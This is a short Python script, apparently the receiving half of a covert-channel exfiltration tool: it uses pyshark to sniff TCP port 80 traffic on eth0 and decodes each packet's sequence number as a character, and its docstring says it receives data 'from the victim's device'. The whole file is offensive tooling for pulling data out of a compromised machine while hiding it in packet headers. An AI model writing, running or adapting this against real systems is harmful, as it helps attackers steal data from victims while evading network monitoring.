import pyshark
import re, sys, time


"""
This function receives data from the victim's device.
"""
def work(intr):
    cap = pyshark.LiveCapture(interface=intr, bpf_filter='tcp port 80')
    print("Started")
    cap.sniff(timeout=5)
    regexp = re.compile(r'sequence number')
    for pkt in cap:
        try:
            data = pkt.tcp.seq
            data = (str(data))
            if int(data) >= 1:
                print(chr(int(str(data))),end="")
                time.sleep(0.03)
                sys.stdout.flush()
        except:
            pass
    pass

def main():
    work('eth0')

if __name__ == "__main__":
    main()
